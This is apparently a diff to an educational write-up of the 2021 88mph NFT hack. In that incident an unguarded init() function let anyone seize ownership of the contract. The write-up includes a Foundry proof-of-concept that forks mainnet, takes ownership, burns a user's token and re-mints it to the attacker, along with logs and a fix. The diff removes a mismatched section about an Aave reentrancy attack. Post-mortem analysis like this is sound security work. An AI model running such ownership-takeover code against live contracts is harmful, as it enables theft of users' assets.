@@ -24,9 +24,6 @@ JUNE 15, 2021
 
 In the MPHNFT contract, there was a vulnerability present in 
 init() function, which allowed any user to claim ownership of the contract. 
-Best practices recommend using a constructor or an initialization 
-guard to ensure that the initialization process happens only once.
-
 
 ### Exploited code
 
@@ -45,7 +42,9 @@ guard to ensure that the initialization process happens only once.
         _registerInterface(_INTERFACE_ERC721);
     }
 ```
-### A guard would simply look like this
+
+Best practices recommend using a constructor or an initialization 
+guard to ensure that the initialization process happens only once.
 
 ```solidity
     bool private initialized = false;
@@ -73,14 +72,9 @@ guard to ensure that the initialization process happens only once.
     }
 ```
 
-
-
-
-
-
 # proof of concept (PoC) 
 
-selects a fork of the sepecified network
+We retrieve the historical state of the smart contract prior to the exploit through the use of `createSelectFork`, which creates a fork of the specified network.
 
 Because of the lack of access control we can simply call the `init` function to 
 claim owner ship of the contract
@@ -89,72 +83,65 @@ Now that contract ownership has been established,
 it does not imply ownership of all the NFTs. However,
 we gain the ability to manipulate the NFTs by using the `burn` operation 
 to delete existing tokens and the `mint` operation to create new ones.
-
-by burning a token it gets deleted and it allows the user to 
-
-
-
-`mphNFT.mint(address(this), 1); // mint a new token 1`
-
-
  
 ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.10;
 
-   
-contract ContractTest is DSTest {
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);
+    contract ContractTest is DSTest {
+        CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+        I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);
+    
+        function setUp() public {
+            cheats.createSelectFork("mainnet", 12_516_705); 
+        }
+    
+        function testExploit() public {
+            // Display the current owner of the NFT contract before the exploit
+            console.log("Before exploiting, NFT contract owner:", mphNFT.owner());
+        
+            // Exploit: Call the vulnerable init function to change the owner to this contract's address
+            mphNFT.init(address(this), "0", "0");
+            console.log("After exploiting, NFT contract owner:", mphNFT.owner());
+        
+            // Display the current owner of NFT #1 before burning
+            console.log("NFT Owner of #1: ", mphNFT.ownerOf(1));
+        
+            // Exploit: Burn the existing token with ID #1
+            mphNFT.burn(1);
+            
+            // Expect a revert due to querying the owner of a non-existent token
+            cheats.expectRevert(bytes("ERC721: owner query for nonexistent token"));
+        
+            // Display the owner of the non-existent token #1 after burning
+            console.log("After burning: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token burned, nonexistent token
+        
+            // Exploit: Mint a new token #1, now owned by this contract
+            mphNFT.mint(address(this), 1);
+            
+            // Display the owner of the newly minted token #1 after exploiting
+            console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token 1 now owned by us
+        }
 
-    function setUp() public {
-        cheats.createSelectFork("mainnet", 12_516_705); //fork mainnet at block 13715025
+    
+        function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
+            return this.onERC721Received.selector;
+        }
     }
-
-    function testExploit() public {
-        console.log("Before exploiting, NFT contract owner:", mphNFT.owner());
-        mphNFT.init(address(this), "0", "0"); // exploit here, change owner to this contract address
-        console.log("After exploiting, NFT contract owner:", mphNFT.owner());
-        console.log("NFT Owner of #1: ", mphNFT.ownerOf(1));
-        mphNFT.burn(1); //burn the token 1
-        cheats.expectRevert(bytes("ERC721: owner query for nonexistent token"));
-        console.log("After burning: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token burned, nonexistent token
-        mphNFT.mint(address(this), 1); // mint a new token 1
-        console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token 1 now owned by us
-    }
-
-    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
-        return this.onERC721Received.selector;
-    }
-}
 ```
 
-## Conclusion
 
-The reentrancy attack in this context occurs within the `attackLogic` function, specifically when the liquidation call is initiated on the WETH asset within the Aave lending pool. Let's break down one more time how the reentrancy attack was executed:
+Logs:
+```
+  Before exploiting, NFT contract owner: 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD
+  After exploiting, NFT contract owner: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+  NFT Owner of #1:  0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
+  After burning: NFT Owner of #1:  0x0000000000000000000000000000000000000000
+  After exploiting: NFT Owner of #1:  0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+```
 
-### 1. Initiate Liquidation Call
 
-- The `lendingPool.liquidationCall` function is invoked, initiating a liquidation call on the WETH asset.
-- This call triggers the `ontokentransfer` function on the `.burn` method of the aToken, creating a reentrancy point.
-
-### 2. Reentrancy in Liquidation Call
-
-- As part of the Aave protocol's design, the `liquidationCall` function interacts with the aToken's `.burn` method.
-- During this interaction, the aToken executes a series of actions, including transferring funds and updating internal states.
-
-### 3. Reentrancy into External Function
-
-- Since the `.burn` method can trigger external calls, control is transferred back to the `onTokenTransfer` function in your contract.
-
-### 4. BorrowMaxtokens Execution
-
-- The `borrowMaxtokens` function is then executed, allowing for the maximization of borrowing.
-- This function interacts with the Aave lending pool to borrow additional funds based on the current state and conditions.
-
-In summary, the reentrancy attack takes advantage of the reentrancy point created during the liquidation call. By triggering external calls within the Aave protocol, control is transferred back to your contract, allowing you to execute further actions, such as additional borrowing. This sequence of events exploits the vulnerability in the Aave protocol, leading to the reentrancy attack.
-
-**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Agave_exp.sol)
+**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)
 
 
 [**< Back**](https://patronasxdxd.github.io/CTFS/)
